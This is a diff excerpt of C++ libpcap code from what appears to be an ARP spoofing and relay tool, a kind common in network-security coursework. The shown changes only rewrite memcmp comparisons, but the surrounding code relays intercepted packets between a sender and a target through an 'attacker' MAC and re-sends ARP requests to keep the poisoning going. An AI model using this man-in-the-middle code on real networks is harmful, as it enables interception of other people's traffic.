@@ -60,7 +60,7 @@ int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
         EthArpPacket *arppkt;
         arppkt = (EthArpPacket *)packet;
         // if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_ip(arppkt->arp_.sip, ip))
-        if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && !memcmp(arppkt->arp_.sip, ip, 4))
+        if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && (memcmp(arppkt->arp_.sip, ip, 4) == 0))
         {
             // copy_mac(arppkt->arp_.smac_, mac);
             memcpy(mac, arppkt->arp_.smac_, 6);
@@ -88,23 +88,23 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
             break;
         }
 
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, target_mac, 6)) && (!memcmp(pkt->arp_.tip, sender_ip, 4)))
+        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (memcmp(pkt->arp_.smac_, target_mac, 6) == 0) && (memcmp(pkt->arp_.tip, sender_ip, 4) == 0))
         {
             printf("where is sender?\n");
             request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, htons(ArpHdr::Request));
             continue;
         }
 
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (!memcmp(pkt->arp_.smac_, sender_mac, 6)) && (!memcmp(pkt->arp_.tip, target_ip, 4)))
+        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (memcmp(pkt->arp_.smac_, sender_mac, 6) == 0) && (memcmp(pkt->arp_.tip, target_ip, 4) == 0))
         {
             printf("where is target?\n");
             request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, htons(ArpHdr::Request));
             continue;
         }
 
-        if (!memcmp(pkt->eth_.smac_, sender_mac, 6))
+        if (memcmp(pkt->eth_.smac_, sender_mac, 6) == 0)
         {
-            if (!memcmp(pkt->eth_.dmac_, attacker_mac, 6))
+            if (memcmp(pkt->eth_.dmac_, attacker_mac, 6) == 0)
             {
                 memcpy(pkt->eth_.dmac_, target_mac, 6);
                 memcpy(pkt->eth_.smac_, attacker_mac, 6);
@@ -119,9 +119,9 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
                 }
             }
         }
-        else if (!memcmp(pkt->eth_.smac_, target_mac, 6))
+        else if (memcmp(pkt->eth_.smac_, target_mac, 6) == 0)
         {
-            if (!memcmp(pkt->eth_.dmac_, attacker_mac, 6))
+            if (memcmp(pkt->eth_.dmac_, attacker_mac, 6) == 0)
             {
                 memcpy(pkt->eth_.dmac_, sender_mac, 6);
                 memcpy(pkt->eth_.smac_, attacker_mac, 6);
